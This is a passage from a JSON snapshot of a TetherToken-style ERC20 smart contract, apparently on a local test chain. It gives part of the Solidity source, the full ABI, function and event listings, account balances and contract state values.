UpgradedStandardToken(upgradedAddress).balanceOf(who);\\n        } else {\\n            return super.balanceOf(who);\\n        }\\n    }\\n\\n    // Forward ERC20 methods to upgraded contract if this one is deprecated\\n    function approve(address _spender, uint _value) public onlyPayloadSize(2 * 32) {\\n        if (deprecated) {\\n            return UpgradedStandardToken(upgradedAddress).approveByLegacy(msg.sender, _spender, _value);\\n        } else {\\n            return super.approve(_spender, _value);\\n        }\\n    }\\n\\n    // Forward ERC20 methods to upgraded contract if this one is deprecated\\n    function allowance(address _owner, address _spender) public constant returns (uint remaining) {\\n        if (deprecated) {\\n            return StandardToken(upgradedAddress).allowance(_owner, _spender);\\n        } else {\\n            return super.allowance(_owner, _spender);\\n        }\\n    }\\n\\n    // deprecate current contract in favour of a new one\\n    function deprecate(address _upgradedAddress) public onlyOwner {\\n        deprecated = true;\\n        upgradedAddress = _upgradedAddress;\\n        Deprecate(_upgradedAddress);\\n    }\\n\\n    // deprecate current contract if favour of a new one\\n    function totalSupply() public constant returns (uint) {\\n        if (deprecated) {\\n            return StandardToken(upgradedAddress).totalSupply();\\n        } else {\\n            return _totalSupply;\\n        }\\n    }\\n\\n    // Issue a new amount of tokens\\n    // these tokens are deposited into the owner address\\n    //\\n    // @param _amount Number of tokens to be issued\\n    function issue(uint amount) public onlyOwner {\\n        require(_totalSupply + amount > _totalSupply);\\n        require(balances[owner] + amount > balances[owner]);\\n\\n        balances[owner] += amount;\\n        _totalSupply += amount;\\n        Issue(amount);\\n    }\\n\\n    // Redeem tokens.\\n    // These tokens are withdrawn from the owner address\\n    // if the balance must be enough to cover the redeem\\n    // or the call will fail.\\n    // @param _amount Number of tokens to be issued\\n    function redeem(uint amount) public onlyOwner {\\n        require(_totalSupply >= amount);\\n        require(balances[owner] >= amount);\\n\\n        _totalSupply -= amount;\\n        balances[owner] -= amount;\\n        Redeem(amount);\\n    }\\n\\n    function setParams(uint newBasisPoints, uint newMaxFee) public onlyOwner {\\n        // Ensure transparency by hardcoding limit beyond which fees can never be added\\n        require(newBasisPoints < 20);\\n        require(newMaxFee < 50);\\n\\n        basisPointsRate = newBasisPoints;\\n        maximumFee = newMaxFee.mul(10**decimals);\\n\\n        Params(basisPointsRate, maximumFee);\\n    }\\n\\n    // Called when new token are issued\\n    event Issue(uint amount);\\n\\n    // Called when tokens are redeemed\\n    event Redeem(uint amount);\\n\\n    // Called when contract is deprecated\\n    event Deprecate(address newAddress);\\n\\n    // Called if contract ever adds fees\\n    event Params(uint feeBasisPoints, uint maxFee);\\n}",\n      "solc_version": "0.4.17"\n    },\n    {\n      "contract_name": "TetherToken",\n      "address": "0x0290FB167208Af455bB137780163b7B7a9a10C16",\n      "abi": [\n        {\n          "constant": true,\n          "inputs": [],\n          "name": "name",\n          "outputs": [\n            {\n              "name": "",\n              "type": "string"\n            }\n          ],\n          "payable": false,\n          "stateMutability": "view",\n          "type": "function"\n        },\n        {\n          "constant": false,\n          "inputs": [\n            {\n              "name": "_upgradedAddress",\n              "type": "address"\n            }\n          ],\n          "name": "deprecate",\n          "outputs": [],\n          "payable": false,\n          "stateMutability": "nonpayable",\n          "type": "function"\n        },\n        {\n          "constant": false,\n          "inputs": [\n            {\n              "name": "_spender",\n              "type": "address"\n            },\n            {\n              "name": "_value",\n              "type": "uint256"\n            }\n          ],\n          "name": "approve",\n          "outputs": [],\n          "payable": false,\n          "stateMutability": "nonpayable",\n          "type": "function"\n        },\n        {\n          "constant": true,\n          "inputs": [],\n          "name": "deprecated",\n          "outputs": [\n            {\n              "name": "",\n              "type": "bool"\n            }\n          ],\n          "payable": false,\n          "stateMutability": "view",\n          "type": "function"\n        },\n        {\n          "constant": false,\n          "inputs": [\n            {\n              "name": "_evilUser",\n              "type": "address"\n            }\n          ],\n          "name": "addBlackList",\n          "outputs": [],\n          "payable": false,\n          "stateMutability": "nonpayable",\n          "type": "function"\n        },\n        {\n          "constant": true,\n          "inputs": [],\n          "name": "totalSupply",\n          "outputs": [\n            {\n              "name": "",\n              "type": "uint256"\n            }\n          ],\n          "payable": false,\n          "stateMutability": "view",\n          "type": "function"\n        },\n        {\n          "constant": false,\n          "inputs": [\n            {\n              "name": "_from",\n              "type": "address"\n            },\n            {\n              "name": "_to",\n              "type": "address"\n            },\n            {\n              "name": "_value",\n              "type": "uint256"\n            }\n          ],\n          "name": "transferFrom",\n          "outputs": [],\n          "payable": false,\n          "stateMutability": "nonpayable",\n          "type": "function"\n        },\n        {\n          "constant": true,\n          "inputs": [],\n          "name": "upgradedAddress",\n          "outputs": [\n            {\n              "name": "",\n              "type": "address"\n            }\n          ],\n          "payable": false,\n          "stateMutability": "view",\n          "type": "function"\n        },\n        {\n          "constant": true,\n          "inputs": [\n            {\n              "name": "",\n              "type": "address"\n            }\n          ],\n          "name": "balances",\n          "outputs": [\n            {\n              "name": "",\n              "type": "uint256"\n            }\n          ],\n          "payable": false,\n          "stateMutability": "view",\n          "type": "function"\n        },\n        {\n          "constant": true,\n          "inputs": [],\n          "name": "decimals",\n          "outputs": [\n            {\n              "name": "",\n              "type": "uint256"\n            }\n          ],\n          "payable": false,\n          "stateMutability": "view",\n          "type": "function"\n        },\n        {\n          "constant": true,\n          "inputs": [],\n          "name": "maximumFee",\n          "outputs": [\n            {\n              "name": "",\n              "type": "uint256"\n            }\n          ],\n          "payable": false,\n          "stateMutability": "view",\n          "type": "function"\n        },\n        {\n          "constant": true,\n          "inputs": [],\n          "name": "_totalSupply",\n          "outputs": [\n            {\n              "name": "",\n              "type": "uint256"\n            }\n          ],\n          "payable": false,\n          "stateMutability": "view",\n          "type": "function"\n        },\n        {\n          "constant": false,\n          "inputs": [],\n          "name": "unpause",\n          "outputs": [],\n          "payable": false,\n          "stateMutability": "nonpayable",\n          "type": "function"\n        },\n        {\n          "constant": true,\n          "inputs": [\n            {\n              "name": "_maker",\n              "type": "address"\n            }\n          ],\n          "name": "getBlackListStatus",\n          "outputs": [\n            {\n              "name": "",\n              "type": "bool"\n            }\n          ],\n          "payable": false,\n          "stateMutability": "view",\n          "type": "function"\n        },\n        {\n          "constant": true,\n          "inputs": [\n            {\n              "name": "",\n              "type": "address"\n            },\n            {\n              "name": "",\n              "type": "address"\n            }\n          ],\n          "name": "allowed",\n          "outputs": [\n            {\n              "name": "",\n              "type": "uint256"\n            }\n          ],\n          "payable": false,\n          "stateMutability": "view",\n          "type": "function"\n        },\n        {\n          "constant": true,\n          "inputs": [],\n          "name": "paused",\n          "outputs": [\n            {\n              "name": "",\n              "type": "bool"\n            }\n          ],\n          "payable": false,\n          "stateMutability": "view",\n          "type": "function"\n        },\n        {\n          "constant": true,\n          "inputs": [\n            {\n              "name": "who",\n              "type": "address"\n            }\n          ],\n          "name": "balanceOf",\n          "outputs": [\n            {\n              "name": "",\n              "type": "uint256"\n            }\n          ],\n          "payable": false,\n          "stateMutability": "view",\n          "type": "function"\n        },\n        {\n          "constant": false,\n          "inputs": [],\n          "name": "pause",\n          "outputs": [],\n          "payable": false,\n          "stateMutability": "nonpayable",\n          "type": "function"\n        },\n        {\n          "constant": true,\n          "inputs": [],\n          "name": "getOwner",\n          "outputs": [\n            {\n              "name": "",\n              "type": "address"\n            }\n          ],\n          "payable": false,\n          "stateMutability": "view",\n          "type": "function"\n        },\n        {\n          "constant": true,\n          "inputs": [],\n          "name": "owner",\n          "outputs": [\n            {\n              "name": "",\n              "type": "address"\n            }\n          ],\n          "payable": false,\n          "stateMutability": "view",\n          "type": "function"\n        },\n        {\n          "constant": true,\n          "inputs": [],\n          "name": "symbol",\n          "outputs": [\n            {\n              "name": "",\n              "type": "string"\n            }\n          ],\n          "payable": false,\n          "stateMutability": "view",\n          "type": "function"\n        },\n        {\n          "constant": false,\n          "inputs": [\n            {\n              "name": "_to",\n              "type": "address"\n            },\n            {\n              "name": "_value",\n              "type": "uint256"\n            }\n          ],\n          "name": "transfer",\n          "outputs": [],\n          "payable": false,\n          "stateMutability": "nonpayable",\n          "type": "function"\n        },\n        {\n          "constant": false,\n          "inputs": [\n            {\n              "name": "newBasisPoints",\n              "type": "uint256"\n            },\n            {\n              "name": "newMaxFee",\n              "type": "uint256"\n            }\n          ],\n          "name": "setParams",\n          "outputs": [],\n          "payable": false,\n          "stateMutability": "nonpayable",\n          "type": "function"\n        },\n        {\n          "constant": false,\n          "inputs": [\n            {\n              "name": "amount",\n              "type": "uint256"\n            }\n          ],\n          "name": "issue",\n          "outputs": [],\n          "payable": false,\n          "stateMutability": "nonpayable",\n          "type": "function"\n        },\n        {\n          "constant": false,\n          "inputs": [\n            {\n              "name": "amount",\n              "type": "uint256"\n            }\n          ],\n          "name": "redeem",\n          "outputs": [],\n          "payable": false,\n          "stateMutability": "nonpayable",\n          "type": "function"\n        },\n        {\n          "constant": true,\n          "inputs": [\n            {\n              "name": "_owner",\n              "type": "address"\n            },\n            {\n              "name": "_spender",\n              "type": "address"\n            }\n          ],\n          "name": "allowance",\n          "outputs": [\n            {\n              "name": "remaining",\n              "type": "uint256"\n            }\n          ],\n          "payable": false,\n          "stateMutability": "view",\n          "type": "function"\n        },\n        {\n          "constant": true,\n          "inputs": [],\n          "name": "basisPointsRate",\n          "outputs": [\n            {\n              "name": "",\n              "type": "uint256"\n            }\n          ],\n          "payable": false,\n          "stateMutability": "view",\n          "type": "function"\n        },\n        {\n          "constant": true,\n          "inputs": [\n            {\n              "name": "",\n              "type": "address"\n            }\n          ],\n          "name": "isBlackListed",\n          "outputs": [\n            {\n              "name": "",\n              "type": "bool"\n            }\n          ],\n          "payable": false,\n          "stateMutability": "view",\n          "type": "function"\n        },\n        {\n          "constant": false,\n          "inputs": [\n            {\n              "name": "_clearedUser",\n              "type": "address"\n            }\n          ],\n          "name": "removeBlackList",\n          "outputs": [],\n          "payable": false,\n          "stateMutability": "nonpayable",\n          "type": "function"\n        },\n        {\n          "constant": true,\n          "inputs": [],\n          "name": "MAX_UINT",\n          "outputs": [\n            {\n              "name": "",\n              "type": "uint256"\n            }\n          ],\n          "payable": false,\n          "stateMutability": "view",\n          "type": "function"\n        },\n        {\n          "constant": false,\n          "inputs": [\n            {\n              "name": "newOwner",\n              "type": "address"\n            }\n          ],\n          "name": "transferOwnership",\n          "outputs": [],\n          "payable": false,\n          "stateMutability": "nonpayable",\n          "type": "function"\n        },\n        {\n          "constant": false,\n          "inputs": [\n            {\n              "name": "_blackListedUser",\n              "type": "address"\n            }\n          ],\n          "name": "destroyBlackFunds",\n          "outputs": [],\n          "payable": false,\n          "stateMutability": "nonpayable",\n          "type": "function"\n        },\n        {\n          "inputs": [\n            {\n              "name": "_initialSupply",\n              "type": "uint256"\n            },\n            {\n              "name": "_name",\n              "type": "string"\n            },\n            {\n              "name": "_symbol",\n              "type": "string"\n            },\n            {\n              "name": "_decimals",\n              "type": "uint256"\n            }\n          ],\n          "payable": false,\n          "stateMutability": "nonpayable",\n          "type": "constructor"\n        },\n        {\n          "anonymous": false,\n          "inputs": [\n            {\n              "indexed": false,\n              "name": "amount",\n              "type": "uint256"\n            }\n          ],\n          "name": "Issue",\n          "type": "event"\n        },\n        {\n          "anonymous": false,\n          "inputs": [\n            {\n              "indexed": false,\n              "name": "amount",\n              "type": "uint256"\n            }\n          ],\n          "name": "Redeem",\n          "type": "event"\n        },\n        {\n          "anonymous": false,\n          "inputs": [\n            {\n              "indexed": false,\n              "name": "newAddress",\n              "type": "address"\n            }\n          ],\n          "name": "Deprecate",\n          "type": "event"\n        },\n        {\n          "anonymous": false,\n          "inputs": [\n            {\n              "indexed": false,\n              "name": "feeBasisPoints",\n              "type": "uint256"\n            },\n            {\n              "indexed": false,\n              "name": "maxFee",\n              "type": "uint256"\n            }\n          ],\n          "name": "Params",\n          "type": "event"\n        },\n        {\n          "anonymous": false,\n          "inputs": [\n            {\n              "indexed": false,\n              "name": "_blackListedUser",\n              "type": "address"\n            },\n            {\n              "indexed": false,\n              "name": "_balance",\n              "type": "uint256"\n            }\n          ],\n          "name": "DestroyedBlackFunds",\n          "type": "event"\n        },\n        {\n          "anonymous": false,\n          "inputs": [\n            {\n              "indexed": false,\n              "name": "_user",\n              "type": "address"\n            }\n          ],\n          "name": "AddedBlackList",\n          "type": "event"\n        },\n        {\n          "anonymous": false,\n          "inputs": [\n            {\n              "indexed": false,\n              "name": "_user",\n              "type": "address"\n            }\n          ],\n          "name": "RemovedBlackList",\n          "type": "event"\n        },\n        {\n          "anonymous": false,\n          "inputs": [\n            {\n              "indexed": true,\n              "name": "owner",\n              "type": "address"\n            },\n            {\n              "indexed": true,\n              "name": "spender",\n              "type": "address"\n            },\n            {\n              "indexed": false,\n              "name": "value",\n              "type": "uint256"\n            }\n          ],\n          "name": "Approval",\n          "type": "event"\n        },\n        {\n          "anonymous": false,\n          "inputs": [\n            {\n              "indexed": true,\n              "name": "from",\n              "type": "address"\n            },\n            {\n              "indexed": true,\n              "name": "to",\n              "type": "address"\n            },\n            {\n              "indexed": false,\n              "name": "value",\n              "type": "uint256"\n            }\n          ],\n          "name": "Transfer",\n          "type": "event"\n        },\n        {\n          "anonymous": false,\n          "inputs": [],\n          "name": "Pause",\n          "type": "event"\n        },\n        {\n          "anonymous": false,\n          "inputs": [],\n          "name": "Unpause",\n          "type": "event"\n        }\n      ],\n      "functions": [\n        {\n          "name": "name",\n          "signature": "name()",\n          "inputs": [],\n          "outputs": [\n            {\n              "name": "",\n              "type": "string"\n            }\n          ],\n          "stateMutability": "view",\n          "payable": false,\n          "constant": true,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "deprecate",\n          "signature": "deprecate(address)",\n          "inputs": [\n            {\n              "name": "_upgradedAddress",\n              "type": "address"\n            }\n          ],\n          "outputs": [],\n          "stateMutability": "nonpayable",\n          "payable": false,\n          "constant": false,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "approve",\n          "signature": "approve(address, uint256)",\n          "inputs": [\n            {\n              "name": "_spender",\n              "type": "address"\n            },\n            {\n              "name": "_value",\n              "type": "uint256"\n            }\n          ],\n          "outputs": [],\n          "stateMutability": "nonpayable",\n          "payable": false,\n          "constant": false,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "deprecated",\n          "signature": "deprecated()",\n          "inputs": [],\n          "outputs": [\n            {\n              "name": "",\n              "type": "bool"\n            }\n          ],\n          "stateMutability": "view",\n          "payable": false,\n          "constant": true,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "addBlackList",\n          "signature": "addBlackList(address)",\n          "inputs": [\n            {\n              "name": "_evilUser",\n              "type": "address"\n            }\n          ],\n          "outputs": [],\n          "stateMutability": "nonpayable",\n          "payable": false,\n          "constant": false,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "totalSupply",\n          "signature": "totalSupply()",\n          "inputs": [],\n          "outputs": [\n            {\n              "name": "",\n              "type": "uint256"\n            }\n          ],\n          "stateMutability": "view",\n          "payable": false,\n          "constant": true,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "transferFrom",\n          "signature": "transferFrom(address, address, uint256)",\n          "inputs": [\n            {\n              "name": "_from",\n              "type": "address"\n            },\n            {\n              "name": "_to",\n              "type": "address"\n            },\n            {\n              "name": "_value",\n              "type": "uint256"\n            }\n          ],\n          "outputs": [],\n          "stateMutability": "nonpayable",\n          "payable": false,\n          "constant": false,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "upgradedAddress",\n          "signature": "upgradedAddress()",\n          "inputs": [],\n          "outputs": [\n            {\n              "name": "",\n              "type": "address"\n            }\n          ],\n          "stateMutability": "view",\n          "payable": false,\n          "constant": true,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "balances",\n          "signature": "balances(address)",\n          "inputs": [\n            {\n              "name": "",\n              "type": "address"\n            }\n          ],\n          "outputs": [\n            {\n              "name": "",\n              "type": "uint256"\n            }\n          ],\n          "stateMutability": "view",\n          "payable": false,\n          "constant": true,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "decimals",\n          "signature": "decimals()",\n          "inputs": [],\n          "outputs": [\n            {\n              "name": "",\n              "type": "uint256"\n            }\n          ],\n          "stateMutability": "view",\n          "payable": false,\n          "constant": true,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "maximumFee",\n          "signature": "maximumFee()",\n          "inputs": [],\n          "outputs": [\n            {\n              "name": "",\n              "type": "uint256"\n            }\n          ],\n          "stateMutability": "view",\n          "payable": false,\n          "constant": true,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "_totalSupply",\n          "signature": "_totalSupply()",\n          "inputs": [],\n          "outputs": [\n            {\n              "name": "",\n              "type": "uint256"\n            }\n          ],\n          "stateMutability": "view",\n          "payable": false,\n          "constant": true,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "unpause",\n          "signature": "unpause()",\n          "inputs": [],\n          "outputs": [],\n          "stateMutability": "nonpayable",\n          "payable": false,\n          "constant": false,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "getBlackListStatus",\n          "signature": "getBlackListStatus(address)",\n          "inputs": [\n            {\n              "name": "_maker",\n              "type": "address"\n            }\n          ],\n          "outputs": [\n            {\n              "name": "",\n              "type": "bool"\n            }\n          ],\n          "stateMutability": "view",\n          "payable": false,\n          "constant": true,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "allowed",\n          "signature": "allowed(address, address)",\n          "inputs": [\n            {\n              "name": "",\n              "type": "address"\n            },\n            {\n              "name": "",\n              "type": "address"\n            }\n          ],\n          "outputs": [\n            {\n              "name": "",\n              "type": "uint256"\n            }\n          ],\n          "stateMutability": "view",\n          "payable": false,\n          "constant": true,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "paused",\n          "signature": "paused()",\n          "inputs": [],\n          "outputs": [\n            {\n              "name": "",\n              "type": "bool"\n            }\n          ],\n          "stateMutability": "view",\n          "payable": false,\n          "constant": true,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "balanceOf",\n          "signature": "balanceOf(address)",\n          "inputs": [\n            {\n              "name": "who",\n              "type": "address"\n            }\n          ],\n          "outputs": [\n            {\n              "name": "",\n              "type": "uint256"\n            }\n          ],\n          "stateMutability": "view",\n          "payable": false,\n          "constant": true,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "pause",\n          "signature": "pause()",\n          "inputs": [],\n          "outputs": [],\n          "stateMutability": "nonpayable",\n          "payable": false,\n          "constant": false,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "getOwner",\n          "signature": "getOwner()",\n          "inputs": [],\n          "outputs": [\n            {\n              "name": "",\n              "type": "address"\n            }\n          ],\n          "stateMutability": "view",\n          "payable": false,\n          "constant": true,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "owner",\n          "signature": "owner()",\n          "inputs": [],\n          "outputs": [\n            {\n              "name": "",\n              "type": "address"\n            }\n          ],\n          "stateMutability": "view",\n          "payable": false,\n          "constant": true,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "symbol",\n          "signature": "symbol()",\n          "inputs": [],\n          "outputs": [\n            {\n              "name": "",\n              "type": "string"\n            }\n          ],\n          "stateMutability": "view",\n          "payable": false,\n          "constant": true,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "transfer",\n          "signature": "transfer(address, uint256)",\n          "inputs": [\n            {\n              "name": "_to",\n              "type": "address"\n            },\n            {\n              "name": "_value",\n              "type": "uint256"\n            }\n          ],\n          "outputs": [],\n          "stateMutability": "nonpayable",\n          "payable": false,\n          "constant": false,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "setParams",\n          "signature": "setParams(uint256, uint256)",\n          "inputs": [\n            {\n              "name": "newBasisPoints",\n              "type": "uint256"\n            },\n            {\n              "name": "newMaxFee",\n              "type": "uint256"\n            }\n          ],\n          "outputs": [],\n          "stateMutability": "nonpayable",\n          "payable": false,\n          "constant": false,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "issue",\n          "signature": "issue(uint256)",\n          "inputs": [\n            {\n              "name": "amount",\n              "type": "uint256"\n            }\n          ],\n          "outputs": [],\n          "stateMutability": "nonpayable",\n          "payable": false,\n          "constant": false,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "redeem",\n          "signature": "redeem(uint256)",\n          "inputs": [\n            {\n              "name": "amount",\n              "type": "uint256"\n            }\n          ],\n          "outputs": [],\n          "stateMutability": "nonpayable",\n          "payable": false,\n          "constant": false,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "allowance",\n          "signature": "allowance(address, address)",\n          "inputs": [\n            {\n              "name": "_owner",\n              "type": "address"\n            },\n            {\n              "name": "_spender",\n              "type": "address"\n            }\n          ],\n          "outputs": [\n            {\n              "name": "remaining",\n              "type": "uint256"\n            }\n          ],\n          "stateMutability": "view",\n          "payable": false,\n          "constant": true,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "basisPointsRate",\n          "signature": "basisPointsRate()",\n          "inputs": [],\n          "outputs": [\n            {\n              "name": "",\n              "type": "uint256"\n            }\n          ],\n          "stateMutability": "view",\n          "payable": false,\n          "constant": true,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "isBlackListed",\n          "signature": "isBlackListed(address)",\n          "inputs": [\n            {\n              "name": "",\n              "type": "address"\n            }\n          ],\n          "outputs": [\n            {\n              "name": "",\n              "type": "bool"\n            }\n          ],\n          "stateMutability": "view",\n          "payable": false,\n          "constant": true,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "removeBlackList",\n          "signature": "removeBlackList(address)",\n          "inputs": [\n            {\n              "name": "_clearedUser",\n              "type": "address"\n            }\n          ],\n          "outputs": [],\n          "stateMutability": "nonpayable",\n          "payable": false,\n          "constant": false,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "MAX_UINT",\n          "signature": "MAX_UINT()",\n          "inputs": [],\n          "outputs": [\n            {\n              "name": "",\n              "type": "uint256"\n            }\n          ],\n          "stateMutability": "view",\n          "payable": false,\n          "constant": true,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "transferOwnership",\n          "signature": "transferOwnership(address)",\n          "inputs": [\n            {\n              "name": "newOwner",\n              "type": "address"\n            }\n          ],\n          "outputs": [],\n          "stateMutability": "nonpayable",\n          "payable": false,\n          "constant": false,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "destroyBlackFunds",\n          "signature": "destroyBlackFunds(address)",\n          "inputs": [\n            {\n              "name": "_blackListedUser",\n              "type": "address"\n            }\n          ],\n          "outputs": [],\n          "stateMutability": "nonpayable",\n          "payable": false,\n          "constant": false,\n          "visibility": "public",\n          "modifiers": []\n        }\n      ],\n      "events": [\n        {\n          "name": "Issue",\n          "inputs": [\n            {\n              "indexed": false,\n              "name": "amount",\n              "type": "uint256"\n            }\n          ]\n        },\n        {\n          "name": "Redeem",\n          "inputs": [\n            {\n              "indexed": false,\n              "name": "amount",\n              "type": "uint256"\n            }\n          ]\n        },\n        {\n          "name": "Deprecate",\n          "inputs": [\n            {\n              "indexed": false,\n              "name": "newAddress",\n              "type": "address"\n            }\n          ]\n        },\n        {\n          "name": "Params",\n          "inputs": [\n            {\n              "indexed": false,\n              "name": "feeBasisPoints",\n              "type": "uint256"\n            },\n            {\n              "indexed": false,\n              "name": "maxFee",\n              "type": "uint256"\n            }\n          ]\n        },\n        {\n          "name": "DestroyedBlackFunds",\n          "inputs": [\n            {\n              "indexed": false,\n              "name": "_blackListedUser",\n              "type": "address"\n            },\n            {\n              "indexed": false,\n              "name": "_balance",\n              "type": "uint256"\n            }\n          ]\n        },\n        {\n          "name": "AddedBlackList",\n          "inputs": [\n            {\n              "indexed": false,\n              "name": "_user",\n              "type": "address"\n            }\n          ]\n        },\n        {\n          "name": "RemovedBlackList",\n          "inputs": [\n            {\n              "indexed": false,\n              "name": "_user",\n              "type": "address"\n            }\n          ]\n        },\n        {\n          "name": "Approval",\n          "inputs": [\n            {\n              "indexed": true,\n              "name": "owner",\n              "type": "address"\n            },\n            {\n              "indexed": true,\n              "name": "spender",\n              "type": "address"\n            },\n            {\n              "indexed": false,\n              "name": "value",\n              "type": "uint256"\n            }\n          ]\n        },\n        {\n          "name": "Transfer",\n          "inputs": [\n            {\n              "indexed": true,\n              "name": "from",\n              "type": "address"\n            },\n            {\n              "indexed": true,\n              "name": "to",\n              "type": "address"\n            },\n            {\n              "indexed": false,\n              "name": "value",\n              "type": "uint256"\n            }\n          ]\n        },\n        {\n          "name": "Pause",\n          "inputs": []\n        },\n        {\n          "name": "Unpause",\n          "inputs": []\n        }\n      ],\n      "accounts_balances": {\n        "0x0290FB167208Af455bB137780163b7B7a9a10C16": 0,\n        "0x90F8bf6A479f320ead074411a4B0e7944Ea8c9C1": 99857894140000000000,\n        "0xFFcf8FDEE72ac11b5c542428B35EEF5769C409f0": 96999153260000000000,\n        "0x22d491Bde2303f2f43325b2108D26f1eAbA1e32b": 100000000000000000000\n      },\n      "public_state": {\n        "_contract_eth_balance_wei": 0,\n        "_contract_eth_balance_eth": 0,\n        "name": "MyToken",\n        "deprecated": false,\n        "totalSupply": 1000000,\n        "upgradedAddress": "0x0000000000000000000000000000000000000000",\n        "balances": [\n          {\n            "address": "0x90F8bf6A479f320ead074411a4B0e7944Ea8c9C1",\n            "value": 1000000\n          },\n          {\n            "address": "0xFFcf8FDEE72ac11b5c542428B35EEF5769C409f0",\n            "value": 0\n          },\n          {\n            "address": "0x22d491Bde2303f2f43325b2108D26f1eAbA1e32b",\n            "value": 0\n          }\n        ],\n        "decimals": 18,\n        "maximumFee": 0,\n        "_totalSupply": 1000000,\n        "getBlackListStatus": [\n          {\n            "address": "0x90F8bf6A479f320ead074411a4B0e7944Ea8c9C1",\n            "value": false\n          },\n          {\n            "address": "0xFFcf8FDEE72ac11b5c542428B35EEF5769C409f0",\n            "value": false\n          },\n          {\n            "address": "0x22d491Bde2303f2f43325b2108D26f1eAbA1e32b",\n            "value": false\n          }\n        ],\n        "paused": false,\n        "balanceOf": [\n          {\n            "address": "0x90F8bf6A479f320ead074411a4B0e7944Ea8c9C1",\n            "value": 1000000\n          },\n          {\n            "address": "0xFFcf8FDEE72ac11b5c542428B35EEF5769C409f0",\n            "value": 0\n          },\n          {\n            "address": "0x22d491Bde2303f2f43325b2108D26f1eAbA1e32b",\n            "value": 0\n          }\n        ],\n        "getOwner": "0x90F8bf6A479f320ead074411a4B0e7944Ea8c9C1",\n        "owner": "0x90F8bf6A479f320ead074411a4B0e7944Ea8c9C1",\n        "symbol": "MTK",\n        "basisPointsRate": 0,\n        "isBlackListed": [\n          {\n            "address": "0x90F8bf6A479f320ead074411a4B0e7944Ea8c9C1",\n            "value": false\n          },\n          {\n            "address": "0xFFcf8FDEE72ac11b5c542428B35EEF5769C409f0",\n            "value": false\n          },\n          {\n            "address": "0x22d491Bde2303f2f43325b2108D26f1eAbA1e32b",\n            "value": false\n          }\n        ],\n        "MAX_UINT": 115792089237316195423570985008687907853269984665640564039457584007913129639935\n      },\n      "source_code_snippet": "pragma solidity ^0.4.17;\\n\\n/**\\n * @title SafeMath\\n * @dev Math operations with safety checks that throw on error\\n */\\nlibrary SafeMath {\\n    function mul(uint256 a, uint256 b) internal pure returns (uint256) {\\n        if (a == 0) {\\n            return 0;\\n        }\\n        uint256 c = a * b;\\n        assert(c / a == b);\\n        return c;\\n    }\\n\\n    function div(uint256 a, uint256 b) internal pure returns (uint256) {\\n        // assert(b > 0); // Solidity automatically throws when dividing by 0\\n        uint256 c = a / b;\\n        // assert(a == b * c + a % b); // There is no case in which this doesn\'t hold\\n        return c;\\n    }\\n\\n    function sub(uint256 a, uint256 b) internal pure returns (uint256) {\\n        assert(b <= a);\\n        return a - b;\\n    }\\n\\n    function add(uint256 a, uint256 b) internal pure returns (uint256) {\\n        uint256 c = a + b;\\n        assert(c >= a);\\n        return c;\\n    }\\n}\\n\\n/**\\n * @title Ownable\\n * @dev The Ownable contract has an owner address, and provides basic authorization control\\n * functions, this simplifies the implementation of \\"user permissions\\".\\n */\\ncontract Ownable {\\n    address public owner;\\n\\n    /**\\n      * @dev The Ownable constructor sets the original `owner` of the contract to the sender\\n      * account.\\n      */\\n    function Ownable() public {\\n        owner = msg.sender;\\n    }\\n\\n    /**\\n      * @dev Throws if called by any account other than the owner.\\n      */\\n    modifier onlyOwner() {\\n        require(msg.sender == owner);\\n        _;\\n    }\\n\\n    /**\\n    * @dev Allows the current owner to transfer control of the contract to a newOwner.\\n    * @param newOwner The address to transfer ownership to.\\n    */\\n    function transferOwnership(address newOwner) public onlyOwner {\\n        if (newOwner != address(0)) {\\n            owner = newOwner;\\n        }\\n    }\\n\\n}\\n\\n/**\\n * @title ERC20Basic\\n * @dev Simpler version of ERC20 interface\\n * @dev see https://github.com/ethereum/EIPs/issues/20\\n */\\ncontract ERC20Basic {\\n    uint public _totalSupply;\\n    function totalSupply() public constant returns (uint);\\n    function balanceOf(address who) public constant returns (uint);\\n    function transfer(address to, uint value) public;\\n    event Transfer(address indexed from, address indexed to, uint value);\\n}\\n\\n/**\\n * @title ERC20 interface\\n * @dev see https://github.com/ethereum/EIPs/issues/20\\n */\\ncontract ERC20 is ERC20Basic {\\n    function allowance(address owner, address spender) public constant returns (uint);\\n    function transferFrom(address from, address to, uint value) public;\\n    function approve(address spender, uint value) public;\\n    event Approval(address indexed owner, address indexed spender, uint value);\\n}\\n\\n/**\\n * @title Basic token\\n * @dev Basic version of StandardToken, with no allowances.\\n */\\ncontract BasicToken is Ownable, ERC20Basic 